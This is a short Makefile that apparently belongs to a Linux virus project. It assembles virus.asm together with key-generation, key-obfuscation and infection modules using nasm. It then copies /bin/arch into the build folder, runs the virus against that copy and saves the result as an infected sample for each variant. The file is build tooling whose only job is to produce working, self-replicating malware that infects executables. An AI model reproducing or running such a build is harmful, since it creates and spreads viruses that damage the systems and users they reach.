# By using this file, you agree to the terms and conditions set
# forth in the COPYING file which can be found at the top level
# of this distribution.
#
all: ../virus.asm ../mk_key.asm ../obskey.asm ../infect.asm
	@echo "Compiling variant $(VARIANT)..."
	@echo "	flags: $(AFLAGS)"
	@nasm -f elf -I.. -I../include -DUSE_RDTSC $(AFLAGS) $< -o virus.o
	@ld virus.o -o virus
	@rm -f virus.o
	@strings virus|grep '^\*\*\*'	
	@cp -f /bin/arch .
	@./virus >/dev/null
	@rm -f virus
	@./arch
	@rm -f ps
	@chmod -x arch
	@mv -f arch samples/arch.infected.$(VARIANT)
